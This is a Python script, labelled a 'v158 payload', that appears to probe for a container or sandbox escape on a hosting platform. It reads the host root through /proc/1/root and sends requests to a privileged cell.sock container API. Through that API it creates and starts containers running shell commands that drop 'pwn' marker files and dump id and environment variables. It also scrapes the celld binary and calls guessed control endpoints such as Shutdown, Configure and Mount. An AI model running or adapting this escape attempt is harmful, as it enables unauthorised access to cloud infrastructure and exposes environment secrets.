# -*- coding: utf-8 -*-
"""v158 payload: Create command/env 行为测试 (决定性) + celld.api.v1 服务枚举 + Mount mounts
输出 /vercel/sandbox/v158c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v158c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=400):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def bin_ctx(path, anchors, before=300, after=1200, max_hits=20):
    try:
        data = open(path, 'rb').read()
        hits = 0
        for anc in anchors:
            if hits >= max_hits:
                break
            for m in re.finditer(re.escape(anc), data):
                s = max(0, m.start() - before)
                seg = data[s:m.start() + after]
                log('CTX %s @0x%x: %r' % (anc, m.start(), seg))
                hits += 1
                if hits >= max_hits:
                    break
        log('CTX done hits=%d' % hits)
    except Exception as e:
        log('CTX EXC %s' % e)


def check_marker(tag):
    """从沙箱视角检查 drive 上的 marker 文件 (容器 rootfs 若=drive 则可见)"""
    res = []
    for p in ['/tmp/v158pwn', '/tmp/v158id', '/tmp/v158env', '/vercel/sandbox/v158pwn']:
        try:
            d = open(p).read()
            res.append('%s=%r' % (p, d[:200]))
        except Exception as e:
            res.append('%s=ERR %s' % (p, type(e).__name__))
    log('%s markers: %s' % (tag, '; '.join(res)))


# ============ 1: command 行为测试 (决定性) ============
log('=== 1 command test ===')
CMD = '/bin/sh -c "echo V158PWN > /tmp/v158pwn; id > /tmp/v158id; env > /tmp/v158env 2>&1; echo DONE"'

# 1a: Create 带 command 数组 + Start
body = json.dumps({'drive_id': 'sandbox', 'command': ['/bin/sh', '-c',
                  'echo V158PWN > /tmp/v158pwn; id > /tmp/v158id; env > /tmp/v158env 2>&1']}).encode()
st, pay = raw_req(CELL, '%s/Create' % CTRS, body, t=8)
log('Create+cmd -> %s %r' % (st, pay))
cid = None
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
if m:
    cid = m.group(1).decode()
    log('containerId=%s' % cid)
    st2, pay2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    log('Start -> %s %r' % (st2, pay2))
time.sleep(2)
check_marker('after cmd-create+start')

# 1b: Create 带 environment + Start
if cid:
    body = json.dumps({'drive_id': 'sandbox',
                       'environment': {'V158ENV': 'HELLO158'},
                       'command': ['/bin/sh', '-c',
                                   'echo $V158ENV > /tmp/v158env2; ls / >> /tmp/v158ls; echo DONE2 >> /tmp/v158env2']}).encode()
    st, pay = raw_req(CELL, '%s/Create' % CTRS, body, t=8)
    log('Create+env -> %s %r' % (st, pay))
    m2 = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
    if m2:
        cid2 = m2.group(1).decode()
        log('containerId2=%s' % cid2)
        st2, pay2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid2}).encode(), t=8)
        log('Start2 -> %s %r' % (st2, pay2))
time.sleep(2)
check_marker('after env-create+start')

# 1c: 检查 runc 目录变化 (Create 后有没有新 uuid)
log('--- runc dirs ---')
try:
    for e in sorted(os.listdir(R + '/run/cell/runc')):
        log('runc dir %s' % e)
except Exception as e:
    log('runc EXC %s' % e)

# 1d: 检查 drive 根目录 (容器 rootfs 是否=drive)
try:
    for e in sorted(os.listdir('/'))[:40]:
        log('drive / %s' % e)
except Exception as e:
    log('root EXC %s' % e)

# ============ 2: celld.api.v1 服务枚举 ============
log('=== 2 celld api ===')
bin_ctx(R + '/opt/vercel/celld',
        [b'vercel.hive.celld.api.v1.', b'celld.api.v1.Celld', b'celld/api/v1/celld'],
        before=200, after=800, max_hits=14)

# 服务路径猜测 + 调用尝试
for path in ['/vercel.hive.celld.api.v1.CelldService/GetDriveStorageUsage',
             '/vercel.hive.celld.api.v1.CelldService/Heartbeat',
             '/vercel.hive.celld.api.v1.CelldService/Configure',
             '/vercel.hive.celld.api.v1.CelldService/SetWorkload',
             '/vercel.hive.celld.api.v1.CelldService/Shutdown',
             '/vercel.hive.celld.api.v1.CelldService/StartContainer',
             '/vercel.hive.celld.api.v1.CelldService/GetResourceUsage',
             '/vercel.hive.api.host.v1.HostService/GetResourceUsage']:
    st, pay = raw_req(CELL, path, b'{}', t=4)
    if '404' not in st:
        log('CELD %s -> %s %r' % (path, st, pay[:200]))

# ============ 3: Mount 带 mounts 数组 ============
log('=== 3 mount mounts ===')
if cid:
    for mounts in [[{'drive_id': 'sandbox', 'mount_path': '/mnt/extra'}],
                   [{'driveId': 'sandbox', 'mountPath': '/mnt/extra2'}],
                   [{'drive_id': 'sandbox', 'mount_path': '/mnt/extra', 'read_only': False}]]:
        st, pay = raw_req(CELL, '%s/Mount' % CTRS,
                          json.dumps({'container_id': cid, 'mounts': mounts}).encode(), t=5)
        log('Mount mounts=%r -> %s %r' % (mounts, st, pay[:250]))

# ============ 4: 提取 process/mount/workload descriptor ============
log('=== 4 proto types ===')
bin_ctx(R + '/opt/vercel/celld',
        [b'types/process.proto', b'types/mount.proto', b'types/workload.proto',
         b'types/drive.proto', b'ProcessRequest'],
        before=100, after=900, max_hits=16)

log('V158_DONE')
f.close()
